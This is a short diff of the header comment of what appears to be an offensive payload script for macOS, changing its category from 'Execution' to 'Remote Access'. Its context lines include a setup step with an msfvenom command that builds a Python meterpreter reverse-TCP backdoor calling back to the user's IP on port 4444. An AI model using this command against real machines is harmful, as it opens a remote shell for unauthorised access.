@@ -5,7 +5,7 @@
 # Author:        afsh4ck
 # Version:       1.0
 # Target:        MacOS
-# Category:      Execution
+# Category:      Remote Access
 #
 # Steps:
 # Step 1: msfvenom -p python/meterpreter/reverse_tcp LHOST={your IP} LPORT=4444 -o backdoor.py  
